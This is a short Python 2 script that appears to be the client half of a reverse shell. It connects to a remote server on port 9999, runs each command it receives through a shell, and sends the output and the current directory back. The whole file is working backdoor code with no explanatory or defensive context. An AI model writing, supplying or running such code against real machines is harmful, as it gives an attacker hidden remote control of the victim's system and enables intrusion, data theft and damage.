import os
import socket
import sys
import subprocess

host=''
port=9999
s=socket.socket()
print "Connecting to server..."
try:
    s.connect((host,port))
except:
    print "error in connecting to server"
    sys.exit()
while True:
    data=s.recv(1024)
    if data[0:2]=='cd':
        os.chdir(data[3:])
    if len(data)>0:
        cmd=subprocess.Popen(data[:], shell= True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        output=str(cmd.stdout.read() + cmd.stderr.read())+"\n"
        reply=output + str(os.getcwd())
        s.sendall(reply) 
